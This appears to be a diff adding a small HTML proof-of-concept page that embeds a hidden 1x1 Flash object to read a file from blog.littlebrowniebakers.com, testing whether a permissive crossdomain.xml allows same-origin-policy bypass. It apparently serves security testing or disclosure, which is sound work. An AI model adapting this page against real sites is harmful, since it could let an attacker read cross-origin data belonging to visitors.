@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Flash SOP Bypass PoC</title>
+</head>
+<body>
+    <h2>PoC: Reading from blog.littlebrowniebakers.com via Flash</h2>
+    <object width="1" height="1"
+        type="application/x-shockwave-flash"
+        data="flash_requester.swf">
+        <param name="FlashVars" value="url=https://blog.littlebrowniebakers.com/robots.txt" />
+    </object>
+    <p>If the crossdomain.xml policy allows <code>*</code>, the response will be accessible to this SWF file.</p>
+</body>
+</html>
